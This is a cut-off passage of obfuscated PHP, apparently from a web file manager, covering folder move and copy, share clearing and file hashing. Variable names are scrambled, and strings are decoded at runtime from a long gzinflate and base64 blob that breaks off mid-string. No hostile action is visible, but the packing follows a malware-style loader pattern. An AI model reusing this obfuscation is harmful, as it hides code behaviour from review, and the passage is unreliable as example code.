(!$ˆ¿ÁÄë) { Model($¯çÄÔ«Ô[546])->remove($ƒô€–şï[$¯çÄÔ«Ô[543]]); } $this->removeNow($Ì­ªêÉĞ, !1); $this->folderSizeReset($Ê×¸ù•¾); Hook::trigger($¯çÄÔ«Ô[664], $ÈØ¦¹ò‘); return $¹¿º‰©; } } $È›¹¢ûû = $ªÉ¤Ïˆ ? $ªÉ¤Ïˆ : $ƒô€–şï[$¯çÄÔ«Ô[32]]; $this->lockMoveStart($Ì­ªêÉĞ); $this->lockWriteStart($Ê×¸ù•¾, $È›¹¢ûû); $ö¤ÛóÅ¥ = array($¯çÄÔ«Ô[634] => array(), $¯çÄÔ«Ô[665] => !1); $this->clearShare($Ì­ªêÉĞ, $Ê×¸ù•¾); $½ˆ×üî = $this->fileNameExistAuto($Ê×¸ù•¾, $ƒô€–şï); $É›†Ìò = $this->_move($Ì­ªêÉĞ, $Ê×¸ù•¾, $õ¹›Ë, $ö¤ÛóÅ¥, $ªÉ¤Ïˆ); $this->sourceCacheClear(); if ($ƒô€–şï[$¯çÄÔ«Ô[487]] == $¯çÄÔ«Ô[91] && $½ˆ×üî) { $this->folderSizeResetChildren($É›†Ìò); } Model($¯çÄÔ«Ô[232])->linkAdd($ö¤ÛóÅ¥[$¯çÄÔ«Ô[634]]); if ($É›†Ìò && $½ˆ×üî && $ö¤ÛóÅ¥[$¯çÄÔ«Ô[665]]) { $·Õ­¿Û = $ƒô€–şï[$¯çÄÔ«Ô[487]] == $¯çÄÔ«Ô[91] ? $this->_childrenListSelect($Ì­ªêÉĞ) : !1; $ì±õ ¤ = $·Õ­¿Û && count($·Õ­¿Û) > 0 ? !0 : !1; $this->removeNow($Ì­ªêÉĞ, $ì±õ ¤); } $this->lockMoveEnd($Ì­ªêÉĞ); $this->lockWriteEnd($Ê×¸ù•¾, $È›¹¢ûû); $this->folderSizeReset($ƒô€–şï[$¯çÄÔ«Ô[192]]); $this->folderSizeReset($Ê×¸ù•¾); $›øË£Ğò = array($ƒô€–şï[$¯çÄÔ«Ô[192]], $Ê×¸ù•¾); if ($ƒô€–şï[$¯çÄÔ«Ô[487]] == $¯çÄÔ«Ô[91]) { $›øË£Ğò[] = $Ì­ªêÉĞ; } $this->updateModifyTime($›øË£Ğò); Model($¯çÄÔ«Ô[638])->eventMove($Ì­ªêÉĞ, $ƒô€–şï[$¯çÄÔ«Ô[192]], $Ê×¸ù•¾); Hook::trigger($¯çÄÔ«Ô[664], $ÈØ¦¹ò‘); return $É›†Ìò; } private function _move($ÊÈæ·, $ÊÈ¯Ï, $«Ë¶Õ’¦, &$Ä°ı±Ì¨, $–‡Îİ¦¤ = '') { $îŞ÷í»¡ =& $_SERVER[Š—Â“œÔ]; $›ëé — = $this->sourceInfo($ÊÈæ·); $ƒ¥¢ªØñ = $›ëé —[$îŞ÷í»¡[487]] == $îŞ÷í»¡[91]; $”©±«–¢ = $–‡Îİ¦¤ ? $–‡Îİ¦¤ : $›ëé —[$îŞ÷í»¡[32]]; $š­¶âµú = $this->fileNameExistAuto($ÊÈ¯Ï, $›ëé —); $this->lockMoveStart($ÊÈæ·); $this->lockWriteStart($ÊÈ¯Ï, $”©±«–¢); if (!$š­¶âµú) { return $this->_moveForce($ÊÈæ·, $ÊÈ¯Ï, $”©±«–¢); } $£ì©°ÉÖ = $š­¶âµú; $ªÍÄ§¹Ñ = !1; if ($ƒ¥¢ªØñ) { if ($«Ë¶Õ’¦ == REPEAT_RENAME_FOLDER) { $”©±«–¢ = $this->fileNameAuto($ÊÈ¯Ï, $”©±«–¢, $«Ë¶Õ’¦, $ƒ¥¢ªØñ); $£ì©°ÉÖ = $this->_moveForce($ÊÈæ·, $ÊÈ¯Ï, $”©±«–¢); } else { $Šœ²Óğ‘ = $this->_childrenListSelect($ÊÈæ·); foreach ($Šœ²Óğ‘ as $”¢ŞñòÇ) { $¬ÇÃ„Ô‹ = REPEAT_REPLACE; $this->_move($”¢ŞñòÇ[$îŞ÷í»¡[193]], $š­¶âµú, $¬ÇÃ„Ô‹, $Ä°ı±Ì¨); } $ªÍÄ§¹Ñ = !0; } } else { if ($«Ë¶Õ’¦ == REPEAT_RENAME || $«Ë¶Õ’¦ == REPEAT_RENAME_FOLDER) { $”©±«–¢ = $this->fileNameAuto($ÊÈ¯Ï, $”©±«–¢, $«Ë¶Õ’¦, $ƒ¥¢ªØñ); $£ì©°ÉÖ = $this->_moveForce($ÊÈæ·, $ÊÈ¯Ï, $”©±«–¢); } else { $‚¾„œşı = $this->sourceInfoCache($š­¶âµú); $äğÍ¿“Æ = $this->fileHistory($‚¾„œşı, $›ëé —[$îŞ÷í»¡[543]], $›ëé —[$îŞ÷í»¡[79]]); if ($äğÍ¿“Æ) { $Ä°ı±Ì¨[$îŞ÷í»¡[634]][] = $›ëé —[$îŞ÷í»¡[543]]; } $ªÍÄ§¹Ñ = !0; } } if ($ªÍÄ§¹Ñ) { $Ä°ı±Ì¨[$îŞ÷í»¡[665]] = !0; } return $£ì©°ÉÖ; } private function _moveForce($Ç‡Ò¨ñ, $Èş½†£Ú, $‡‡îœ ‚) { $Ã¯šÆ»ù =& $_SERVER[Š—Â“œÔ]; $Ú§±ÕĞû = $this->sourceInfo($Ç‡Ò¨ñ); $üº‰èÃ = $this->sourceInfo($Èş½†£Ú); $Â¡ãú‹Ğ = $Ú§±ÕĞû[$Ã¯šÆ»ù[487]] == $Ã¯šÆ»ù[91]; $ç”î°Ç´ = array($Ã¯šÆ»ù[479] => $üº‰èÃ[$Ã¯šÆ»ù[193]], $Ã¯šÆ»ù[657] => $üº‰èÃ[$Ã¯šÆ»ù[586]] . $üº‰èÃ[$Ã¯šÆ»ù[193]] . $Ã¯šÆ»ù[50], $Ã¯šÆ»ù[653] => $üº‰èÃ[$Ã¯šÆ»ù[190]], $Ã¯šÆ»ù[654] => $üº‰èÃ[$Ã¯šÆ»ù[571]], $Ã¯šÆ»ù[656] => USER_ID, $Ã¯šÆ»ù[496] => $‡‡îœ ‚); $Äà™¡® = $Ú§±ÕĞû[$Ã¯šÆ»ù[190]] == SourceModel::TYPE_GROUP && $üº‰èÃ[$Ã¯šÆ»ù[190]] == SourceModel::TYPE_GROUP && $Ú§±ÕĞû[$Ã¯šÆ»ù[571]] == $üº‰èÃ[$Ã¯šÆ»ù[571]]; if (!$Äà™¡® && $this->moveClearAuth) { Model($Ã¯šÆ»ù[569])->authClear($Ç‡Ò¨ñ); } $¼šŞ÷¡Š = $Ú§±ÕĞû[$Ã¯šÆ»ù[507]] == $Ã¯šÆ»ù[91] && $üº‰èÃ[$Ã¯šÆ»ù[507]] != $Ã¯šÆ»ù[91]; if ($¼šŞ÷¡Š) { $ç”î°Ç´[$Ã¯šÆ»ù[506]] = 0; } if ($Â¡ãú‹Ğ) { $÷ÇÈ£’ß = array($Ã¯šÆ»ù[657] => array($Ã¯šÆ»ù[617], $Ú§±ÕĞû[$Ã¯šÆ»ù[586]] . $Ú§±ÕĞû[$Ã¯šÆ»ù[193]] . $Ã¯šÆ»ù[618])); $‘óªŞÁâ = $Ú§±ÕĞû[$Ã¯šÆ»ù[586]] . $Ú§±ÕĞû[$Ã¯šÆ»ù[193]] . $Ã¯šÆ»ù[50]; $ëÆÃ“–ã = $üº‰èÃ[$Ã¯šÆ»ù[586]] . $üº‰èÃ[$Ã¯šÆ»ù[193]] . $Ã¯šÆ»ù[50] . $Ú§±ÕĞû[$Ã¯šÆ»ù[193]] . $Ã¯šÆ»ù[50]; $œéœç­Á = array($Ã¯šÆ»ù[657] => array($Ã¯šÆ»ù[666], "\162\145\x70\154\141\x63\x65\x28\160\x61\x72\x65\x6e\164\114\x65\x76\x65\154\54\47{$‘óªŞÁâ}\47\54\x27{$ëÆÃ“–ã}\47\51"), $Ã¯šÆ»ù[653] => $üº‰èÃ[$Ã¯šÆ»ù[190]], $Ã¯šÆ»ù[654] => $üº‰èÃ[$Ã¯šÆ»ù[571]]); if ($¼šŞ÷¡Š) { $œéœç­Á[$Ã¯šÆ»ù[506]] = 0; } $this->where($÷ÇÈ£’ß)->data($œéœç­Á)->save(); } $this->where(array($Ã¯šÆ»ù[493] => $Ç‡Ò¨ñ))->data($ç”î°Ç´)->save(); return $Ç‡Ò¨ñ; } private function clearShare($ôõå³šŒ, $Òˆë) { $„íª”ã› =& $_SERVER[Š—Â“œÔ]; $¡âì³Ş = $this->sourceInfo($ôõå³šŒ); $âŠ··¿’ = $this->sourceInfo($Òˆë); if ($¡âì³Ş[$„íª”ã›[571]] == $âŠ··¿’[$„íª”ã›[571]] && $¡âì³Ş[$„íª”ã›[190]] == $„íª”ã›[667]) { return; } $ÈåÚ•À÷ = array($„íª”ã›[586] => array($„íª”ã›[617], $¡âì³Ş[$„íª”ã›[586]] . $ôõå³šŒ . $„íª”ã›[618])); $£ÖçÇì£ = $this->field($„íª”ã›[493])->where($ÈåÚ•À÷)->getField($„íª”ã›[193], !0); if (!$£ÖçÇì£) { return; } $ÈåÚ•À÷ = array($„íª”ã›[193] => array($„íª”ã›[7], $£ÖçÇì£), $„íª”ã›[668] => 1); $îÛ»¿Ÿï = Model($„íª”ã›[669])->field($„íª”ã›[670])->where($ÈåÚ•À÷)->select(); if (!$îÛ»¿Ÿï) { return; } $îÛ»¿Ÿï = array_to_keyvalue($îÛ»¿Ÿï, $„íª”ã›[12], $„íª”ã›[670]); $ÈåÚ•À÷ = array($„íª”ã›[670] => array($„íª”ã›[7], $îÛ»¿Ÿï)); Model($„íª”ã›[669])->where($ÈåÚ•À÷)->save(array($„íª”ã›[668] => 0)); Model($„íª”ã›[671])->where($ÈåÚ•À÷)->delete(); } public function copyFolderFromIO($˜«Öèä‰, $Ø”Ø‡®¨, $ƒÅ´Üòë, $ÒğË–, $åú†£Ï’, $ªêÈó€§ = false) { $³‡êÑˆã =& $_SERVER[Š—Â“œÔ]; $µÍšéÌò = array($³‡êÑˆã[635] => array(), $³‡êÑˆã[636] => array(), $³‡êÑˆã[634] => array(), $³‡êÑˆã[672] => array()); $­‹Á¯¬ = $ªêÈó€§ ? $ªêÈó€§ : $˜«Öèä‰->pathThis($Ø”Ø‡®¨); $Çİ¦Š½— = $this->fileNameExist($ƒÅ´Üòë, $­‹Á¯¬); $€ª§Ä = $this->mkdir($ƒÅ´Üòë, $­‹Á¯¬, $ÒğË–); if (!$Çİ¦Š½— || $ÒğË– == REPEAT_RENAME_FOLDER) { $ÒğË– = !1; } if ($Çİ¦Š½—) { $this->_childrenAllMake($Çİ¦Š½—); } Hook::trigger($³‡êÑˆã[673]); $this->_copyChildTo($˜«Öèä‰, $Ø”Ø‡®¨, $€ª§Ä, $ÒğË–, $µÍšéÌò, $åú†£Ï’); Hook::trigger($³‡êÑˆã[674]); if ($€ª§Ä) { $this->folderSizeResetChildren($€ª§Ä); } $this->_childrenListClear(); Model($³‡êÑˆã[637])->addAll($µÍšéÌò[$³‡êÑˆã[635]], array(), !0); Model($³‡êÑˆã[638])->eventCopy($€ª§Ä); $this->saveAll($µÍšéÌò[$³‡êÑˆã[636]]); Model($³‡êÑˆã[546])->linkAdd($µÍšéÌò[$³‡êÑˆã[634]]); Model($³‡êÑˆã[546])->remove($µÍšéÌò[$³‡êÑˆã[672]]); $this->folderSizeReset($ƒÅ´Üòë); $this->updateModifyTime($ƒÅ´Üòë); return $€ª§Ä; } private function _copyChildTo($‘‰ıöÉ˜, $®¹ÏÄ¯Ï, $Ş—‘ÊÂ, $¯Şˆİ¯, &$«¸Ñ®•», $Ø³ŸÌåŞ) { $¯£’ıã =& $_SERVER[Š—Â“œÔ]; $ò¸Çäµ¯ = $this->sourceInfoCache($Ş—‘ÊÂ); $Ü§¯ÆŞ = $‘‰ıöÉ˜->listPath($®¹ÏÄ¯Ï); $Ü§¯ÆŞ = $Ü§¯ÆŞ ? $Ü§¯ÆŞ : array($¯£’ıã[86] => array(), $¯£’ıã[85] => array()); $éáÏœ¦ = array_merge($Ü§¯ÆŞ[$¯£’ıã[86]], $Ü§¯ÆŞ[$¯£’ıã[85]]); $õïù·ÁÔ = $this->_addFiles($‘‰ıöÉ˜, $Ü§¯ÆŞ[$¯£’ıã[86]], $Ø³ŸÌåŞ); $‚´ã = array(); foreach ($éáÏœ¦ as &$Ö¶ÀÀÍí) { if (isset($õïù·ÁÔ[$Ö¶ÀÀÍí[$¯£’ıã[32]]])) { $Ö¶ÀÀÍí = $õïù·ÁÔ[$Ö¶ÀÀÍí[$¯£’ıã[32]]]; } $Ö¶ÀÀÍí[$¯£’ıã[487]] = $Ö¶ÀÀÍí[$¯£’ıã[33]] == $¯£’ıã[78]; $Ö¶ÀÀÍí[$¯£’ıã[488]] = substr(_get($Ö¶ÀÀÍí, $¯£’ıã[169], $¯£’ıã[12]), 0, 10); $Ö¶ÀÀÍí[$¯£’ıã[79]] = _get($Ö¶ÀÀÍí, $¯£’ıã[79], 0); $Ö¶ÀÀÍí[$¯£’ıã[543]] = _get($Ö¶ÀÀÍí, $¯£’ıã[543], 0); if (!isset($Ö¶ÀÀÍí[$¯£’ıã[675]]) && $Ö¶ÀÀÍí[$¯£’ıã[543]]) { $«¸Ñ®•»[$¯£’ıã[672]][] = $Ö¶ÀÀÍí[$¯£’ıã[543]]; } if ($¯Şˆİ¯) { $Ã‡®×³ì = $this->fileNameExistCache($Ş—‘ÊÂ, $Ö¶ÀÀÍí[$¯£’ıã[32]]); if ($Ã‡®×³ì) { if ($Ö¶ÀÀÍí[$¯£’ıã[487]] || $¯Şˆİ¯ == REPEAT_SKIP) { continue; } if ($¯Şˆİ¯ == REPEAT_REPLACE) { $ş€á¹–µ = $this->sourceInfoCache($Ã‡®×³ì); $œÇ©¯Ûû = $this->fileHistory($ş€á¹–µ, $Ö¶ÀÀÍí[$¯£’ıã[543]], $Ö¶ÀÀÍí[$¯£’ıã[79]]); if ($œÇ©¯Ûû) { $«¸Ñ®•»[$¯£’ıã[634]][] = $Ö¶ÀÀÍí[$¯£’ıã[543]]; } continue; } else { if ($¯Şˆİ¯ == REPEAT_RENAME) { $Ö¶ÀÀÍí[$¯£’ıã[32]] = $this->fileNameAutoCache($Ş—‘ÊÂ, $Ö¶ÀÀÍí[$¯£’ıã[32]], $¯Şˆİ¯, !1); } } } } if (!$Ö¶ÀÀÍí[$¯£’ıã[487]] && $Ö¶ÀÀÍí[$¯£’ıã[543]] == 0) { continue; } if (!$Ö¶ÀÀÍí[$¯£’ıã[487]] && $Ö¶ÀÀÍí[$¯£’ıã[543]]) { $«¸Ñ®•»[$¯£’ıã[634]][] = $Ö¶ÀÀÍí[$¯£’ıã[543]]; } $‚´ã[] = $this->_makeItemData($Ö¶ÀÀÍí, $ò¸Çäµ¯, $Ö¶ÀÀÍí[$¯£’ıã[32]]); } unset($Ö¶ÀÀÍí); if (!empty($‚´ã)) { $this->addAll($‚´ã); $this->_childrenListSelect($Ş—‘ÊÂ); } $â·ª…Æš = $this->_childrenList($Ş—‘ÊÂ); $â·ª…Æš = array_to_keyvalue($â·ª…Æš, $¯£’ıã[32]); foreach ($éáÏœ¦ as $Ö¶ÀÀÍí) { $ş€á¹–µ = $â·ª…Æš[$Ö¶ÀÀÍí[$¯£’ıã[32]]]; $÷ÀŒÆäï = $ş€á¹–µ[$¯£’ıã[193]]; $this->_copyApplyMeta($ş€á¹–µ, $«¸Ñ®•»); if ($Ö¶ÀÀÍí[$¯£’ıã[33]] == $¯£’ıã[78]) { $Ö¶ÀÀÍí[$¯£’ıã[87]] = $‘‰ıöÉ˜->getPathInner($Ö¶ÀÀÍí[$¯£’ıã[87]]); $this->_copyChildTo($‘‰ıöÉ˜, $Ö¶ÀÀÍí[$¯£’ıã[87]], $÷ÀŒÆäï, $¯Şˆİ¯, $«¸Ñ®•», $Ø³ŸÌåŞ); } } } private function _addFiles($ôºâ°¤, $ƒ©÷ÆªÛ, $·ĞêãõÇ) { $Šö·‰¡ =& $_SERVER[Š—Â“œÔ]; if (!$ƒ©÷ÆªÛ || count($ƒ©÷ÆªÛ) == 0) { return array(); } $îÀ²À“ñ = array(); foreach ($ƒ©÷ÆªÛ as &$õçãÍæÑ) { Hook::trigger($Šö·‰¡[676], $õçãÍæÑ); $õçãÍæÑ[$Šö·‰¡[87]] = $ôºâ°¤->getPathInner($õçãÍæÑ[$Šö·‰¡[87]]); $å¥£ªü® = $ôºâ°¤->hashSimple($õçãÍæÑ[$Šö·‰¡[87]]); $Ï›˜ºË» = $ôºâ°¤->hashMd5($õçãÍæÑ[$Šö·‰¡[87]]); if (strlen($Ï›˜ºË») > 10 && !isset($îÀ²À“ñ[$Ï›˜ºË»])) { $îÀ²À“ñ[$Ï›˜ºË»] = array(); } $õçãÍæÑ[$Šö·‰¡[677]] = $å¥£ªü®; $õçãÍæÑ[$Šö·‰¡[549]] = $Ï›˜ºË»; $îÀ²À“ñ[$Ï›˜ºË»][] =& $õçãÍæÑ; if (count($îÀ²À“ñ[$Ï›˜ºË»]) > 1) { $õçãÍæÑ[$Šö·‰¡[675]] = !0; } Hook::trigger($Šö·‰¡[678], $õçãÍæÑ); } unset($õçãÍæÑ); $„Ÿıõ‘ƒ = array($Šö·‰¡[549] => array($Šö·‰¡[7], array_keys($îÀ²À“ñ))); $µ……– = Model($Šö·‰¡[679]); $Ô­¥Á³ö = $µ……–->where($„Ÿıõ‘ƒ)->select(); $Ô­¥Á³ö = $Ô­¥Á³ö ? $Ô­¥Á³ö : array(); foreach ($Ô­¥Á³ö as $ÏÉİç¸“) { if (!isset($îÀ²À“ñ[$ÏÉİç¸“[$Šö·‰¡[549]]])) { continue; } $ÏÊöì¨¹ = $îÀ²À“ñ[$ÏÉİç¸“[$Šö·‰¡[549]]]; foreach ($ÏÊöì¨¹ as &$õçãÍæÑ) { $õçãÍæÑ[$Šö·‰¡[543]] = $ÏÉİç¸“[$Šö·‰¡[543]]; $õçãÍæÑ[$Šö·‰¡[675]] = !0; } unset($õçãÍæÑ); } $‚«ÍÈòÎ = array(); foreach ($ƒ©÷ÆªÛ as $Ô¾çˆ©´) { Hook::trigger($Šö·‰¡[680], $Ô¾çˆ©´); if (isset($Ô¾çˆ©´[$Šö·‰¡[675]]) && $Ô¾çˆ©´[$Šö·‰¡[675]]) { Hook::trigger($Šö·‰¡[681], $Ô¾çˆ©´); continue; } $µ‚É€£ = $ôºâ°¤->getPathInner($Ô¾çˆ©´[$Šö·‰¡[87]]); $«€·şÚ« = $µ……–->addFileMake($µ‚É€£, $Ô¾çˆ©´[$Šö·‰¡[79]], $Ô¾çˆ©´[$Šö·‰¡[677]], $Ô¾çˆ©´[$Šö·‰¡[549]], $Ô¾çˆ©´[$Šö·‰¡[32]], $·ĞêãõÇ); Hook::trigger($Šö·‰¡[681], $Ô¾çˆ©´); if (!is_array($«€·şÚ«)) { continue; } $‚«ÍÈòÎ[] = $«€·şÚ«; } $µ……–->addAll($‚«ÍÈòÎ); $„Ÿıõ‘ƒ = array($Šö·‰¡[549] => array($Šö·‰¡[7], array_keys($îÀ²À“ñ))); $Ô­¥Á³ö = $µ……–->where($„Ÿıõ‘ƒ)->select(); $Ô­¥Á³ö = $Ô­¥Á³ö ? $Ô­¥Á³ö : array(); foreach ($Ô­¥Á³ö as $ÏÉİç¸“) { if (!isset($îÀ²À“ñ[$ÏÉİç¸“[$Šö·‰¡[549]]])) { continue; } $Š¥¯¥äÉ =& $îÀ²À“ñ[$ÏÉİç¸“[$Šö·‰¡[549]]]; foreach ($Š¥¯¥äÉ as &$õçãÍæÑ) { $õçãÍæÑ[$Šö·‰¡[543]] = $ÏÉİç¸“[$Šö·‰¡[543]]; } unset($õçãÍæÑ); } $¬õê¼ââ = array(); foreach ($ƒ©÷ÆªÛ as $—ÛĞŞµĞ) { $¬õê¼ââ[$—ÛĞŞµĞ[$Šö·‰¡[32]]] = $—ÛĞŞµĞ; } return $¬õê¼ââ; } } define($_SERVER[Š—Â“œÔ][682], $_SERVER[Š—Â“œÔ][683]); $bhpvlqdosf = $_SERVER[Š—Â“œÔ][684]; goto BÙ¡ÒÂìÊŸ; F–‡–Á«Ÿ–: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x8a\x97\xc2\x93\x9c\xd4", "\xc6\xb4\xbe\x91\xdf\x91"); $_SERVER[Š—Â“œÔ] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x5b\xc5\xb5\x30\x3b\x61\x2b\x8f\x3e\xda\x42\x69\xe9\x8d\x43\xb0\x9d\x68\xb1\x1d\x67\x73\xe2\x24\xb2\x2d\xc7\x4a\x64\xcb\x48\x72\x16\x6c\x73\x73\x25\x5d".base64_decode('W9eWdBXdKy9ZCgTCEhLCFnZKgUKhQAKlUCCEpUChkEeBPmihCy3EToBSCi0tLQH+Wc4s9w==')."\112\206\367\177\357\377\276\77\220\150\346\314\231\271\263\234\71\163\346\314\231\63\277\273\352\365\275\217\135\264\356\40\364\337\41\257\374\164\333\205\173\56\247\341\165\7\242\177\17\244\341\357".base64_decode('XDTpAPLnPy/aVFXVNuvI6R1Hb/3J3dpd2o+0zZHw87tDx7xw15Lg+C3Pj44feMBjh42e0Q==')."\x80\x90\x69\xde\x6\xfa\xa3\xe4\x4c\x5b\xd1\x47\xc\xcb\xb6\x28\x20\x69\xe6\xfa\x8c\x7e\x1a\x36\x72\xf4\xd7\x4f\x7f\xba\xa2\xe1\x82\x9e\x35\x6d\x9d\x46\x7d\xf4\x47\x85\x7a\x91\x7f\xad\xd5\x19\x83\xa5\xab\x1d"."\221\270\32\353\352\354\14\106\343\200\324\40\247\147\315\24\204\362\132\101\313\302\367\363\172\301\102\265\221\213\123\363\146\136\317\71\40\2\220\322\154\55\241\131\120\122\113\223\332\22\354\14"."\107\126\252\361\225\235\101\300\110\250\253\213\172\141\224\306\110\60\146\153\5\73\156\144\165\216\61\134\340\365\152\12\56\16\165\50\361\150\240\43\26\150\216\207\42\35\24\334\34\151\157\17"."\305\113\341\321\110\70\334\24\150\136\132\232\322\31\15\54\156\17\50\250\176\31\135\65\162\175\146\225\262\212\246\254\122\252\151\240\325\320\63\51\32\314\151\254\72\366\150\36\102\161\36\102"."\xc3\x94\x2b\x66\x32\x34\xd2\xc1\x43\x29\xbd\x4f\x2b\x66\xa0\xb7\x5a\xe4\x48\xbe\x60\x64\x35\xd6\xe8\xa5\xfa\x28\x87\xd2\x80\x56\xb4\x4d\x23\x97\xa4\x91\xe0\x88\x5d\xd0\x4\x1c\xd5\x35\x89\x6\x5a\xcf\x41\x51"."\xb1\x60\x38\xd8\x1c\x57\x70\x5\x95\xd6\x68\xa4\x5d\x81\x41\xc8\x6a\x96\xad\x17\x94\xe5\x6d\xc1\x68\x50\xc1\x95\x6e\xac\x24\x6d\xad\x54\x80\x5e\x3a\x50\x57\x28\x81\x70\x58\x99\xa8\x4\x5b\xcf\xe6\x59\x31\x34"."\117\231\302\42\321\226\140\124\151\132\251\210\36\112\232\331\254\231\363\241\122\320\110\332\122\125\203\321\50\15\170\200\274\303\41\74\150\20\211\264\266\306\202\74\6\215\73\55\214\152\62\3".strrev(','."\0".'Kä&ü¢ÈSÑu°È AZ|ša)"Œäm]ÒÓ_øJßÒ™ËHuleõKÓè')."\xc1\xb0\x6\x58\xc0\x40\x33\x74\x88\x6\x1b\x17\xd0\xdf\x79\x90\x3f\xa1\xe2\x34\xbd\x60\xab\x7a\x2e\x69\xa6\x8c\x1c\xcc\xe3\x85\x40\x8f\x9a\x9d\x6e\x29\x18\x8\x81\xc6\xfb\xcc\x4c\x8a\x85\x2d\x63\xd\xb4\xb2".base64_decode('z8joHcWsjMKjybSRSRXY1PsiTBoN85mMcUUsj2qyjjEBo29UTEWM18lTLbNYSOohNHVovA==')."\x16\xc0\xba\x6d\xa3\xc6\xb1\xe\x31\xbb\xf2\x19\x53\x4b\xc5\xf4\x2\x6f\x9a\x61\xb6\xa2\x82\x22\x45\x5b\x6\x16\x9\x5a\xab\x59\xc8\xb6\x20\xa6\x21\xc3\xda\xd1\xb4\x31\x4\x70\x90\x4d\x97\x94\xd4\x5b\xfe\xaa".strrev('\\İP\\’©šİ+5¦¢(hĞ‚?9Jß„u‹LÔÙO˜tGÕFLõ¤úìGTÿB/võŸ½³î').base64_decode('Sh/x5dN5GhUzvcdB77jbOkw7KLHrjJnUMnJTaDht2/mYnkvhXoCmmMM50kt5XQekFo+SUg==').strrev('Ûu´™¿9˜mš’1Ÿ>Zµ˜ŸE†ƒà*-[*PTÊöÅ˜qÖ±ÙŒ±`Ñƒ[J••Ú').base64_decode('a9kFXYMSA8mkblneZjNnF8yMN5DJmMPeSMHoN3INyjSKgxPRXPdivtgAE7hinoKJBn9mWg==')."\x63\xd1\xee\xf3\xce\x61\x13\x93\x63\x17\xb4\x9c\xd5\xa7\x17\xbc\x41\x98\x15\xd\xa\xaa\x2c\x67\x8e\xc\xad\xc5\xb0\xf2\xa6\x65\xe0\xea\x35\x28\x9a\x6d\x6b\xc9\x34\x66\x2c\xa2\xf8\xc6\x2f\xc0\x37\x72\x19\x23"."\247\227\342\242\102\164\157\147\101\353\317\152\15\112\276\230\100\35\0\223\21\140\111\214\41\43\103\7\64\50\131\155\304\253\365\263\222\202\43\171\243\240\133\254\325\312\342\366\70\120\124\237"."\xb7\x1d\x4f\x22\x43\x4f\x79\x63\x88\x73\x43\x61\x33\x6a\xea\x15\x44\x2b\xa\x4b\xa3\xd0\xb6\x78\xbc\x53\xd\xb5\xa2\xa5\xb9\x23\xa8\xb6\x7\xe2\xcd\x6d\x50\xba\xad\xf5\xb3\xa2\xc3\x88\x1f\xf3\x22\x19\x70\x85".base64_decode('F00mTE0dqHEC2GkO6wX04abRBmXQTCXMER9LwsgxxFUYMh7fvO2Narl+3IzEqK0DzQm+1A==')."\204\26\162\137\37\235\271\276\204\336\147\26\240\65\326\120\277\263\363\303\172\256\337\116\263\262\143\301\350\262\140\124\215\105\132\343\313\3\121\130\367\163\210\162\106\130\155\360\327\63\336\250".base64_decode('nkKdmLRZPi0ven+FF08Y/HGWiicRSwuHFuO+a/FaCMkrY7Gyw0bWwM2zeQrpbCQULIYK+Q==')."\x49\x9b\x1b\x7b\xac\x69\x55\x3d\xa9\xe9\xd5\x5e\xf4\xef\xb4\xea\xee\x9e\x16\xdf\xb4\xde\x85\x7e\x43\xe4\xf1\xd7\xfa\x6a\x95\xba\x9a\x59\x4a\x27\x92\x52\xc\x2d\xa3\x40\xa3\x4b\x30\x6a\x94\xc8\x52\x67\xb7\x8"."\12\317\231\71\275\354\304\102\204\144\132\272\267\115\327\20\203\106\3\341\30\27\17\373\26\215\177\101\357\342\165\122\342\45\256\161\241\300\150\360\264\256\140\54\256\266\7\343\155\221\26\250".strrev('¡±/”˜Ö‚4‚przÓš€‹¿8¼9‡_$!Ü¤Ö!úÒ#úˆ4eÆËêLÊ¡'."\0".'0~')."\xeb\xa6\x3f\xbd\x40\xcd\xbd\xf4\x47\x35\xac\x56\x69\xcd\xc4\x51\xce\x5f\x55\x33\x31\x80\x28\xab\x5d\x67\x8b\x8\x7c\x29\x94\x45\x73\x58\xd4\x5c\x75\x2e\x70\xac\x59\xed\x82\xd2\xd1\x94\x59\x6e\xa4\xf8\xa\x88".base64_decode('om260Z+Gihq4uKSZMQtaBvN+JrT2G8CG85kions/LjieLmYTsFKhPurXbSFPWqNI6ALOiw==')."\304\157\324\231\41\30\26\130\163\41\346\127\61\255\366\370\362\271\376\352\123\240\54\265\156\146\15\6\300\60\102\313\220\140\135\324\113\233\356\113\232\150\142\267\153\203\172\3\156\13\160\263"."\171\4\312\42\22\303\234\207\327\270\106\67\137\300\303\223\361\145\121\41\244\314\146\223\257\312\164\353\2\2\20\133\343\24\275\120\60\13\223\1\203\204\25\262\120\342\341\202\302\155\56\162"."\x58\x88\x5\xb0\x70\xda\xe4\x22\x8a\xc9\x88\xb1\xc1\xf\xed\x9e\x5a\xd7\xa\x6c\x23\x85\x44\x35\x9f\x65\xa3\x41\x40\xd\xd4\x52\xa9\x72\x60\xc4\x6a\xa0\x80\x75\x8c\x4e\x49\xc2\x3a\x90\x3\xfc\xb1\x19\xe8\x7f".base64_decode('seinzKzGllDMefhnccTiMbIu6im6MDpAdEZT0DT2yYJt4sSCAxMRadqESiOqgAYXectZHw==')."\244\364\214\316\10\54\255\63\331\242\6\320\320\310\160\362\353\343\363\0\355\34\20\124\10\164\206\25\105\71\261\44\300\342\313\361\126\113\0\260\70\4\164\45\202\31\64\252\21\62\241\104"."\xbc\xb3\xa0\xf7\x19\xc0\xd0\x73\x88\x31\xb4\x6b\x85\x41\xd6\x30\x94\x53\x4c\x45\x1c\x91\xa6\x69\x6b\x57\x38\xac\x36\x47\x3a\xe2\x68\xa7\x46\x21\xcb\xa3\xa1\x38\xb0\xb1\x28\x62\x47\x6a\xa0\xb9\x13\x62\x82\xe9"."\161\211\115\226\71\50\144\250\16\110\10\125\302\57\204\43\264\72\347\315\34\142\255\300\235\274\142\37\127\222\224\22\262\3\320\216\220\67\134\42\4\22\2\262\153\274\131\304\127\274\274\116"."\235\135\260\370\63\252\140\62\160\323\50\26\157\141\360\215\376\334\62\76\362\313\143\365\336\266\366\100\263\67\326\26\250\233\71\213\102\127\146\123\75\361\66\303\352\71\235\307\241\72\303\126"."\275\132\320\321\234\146\264\120\127\123\313\146\34\22\104\64\121\363\225\336\254\27\227\202\145\110\137\115\115\15\53\153\372\54\45\215\130\311\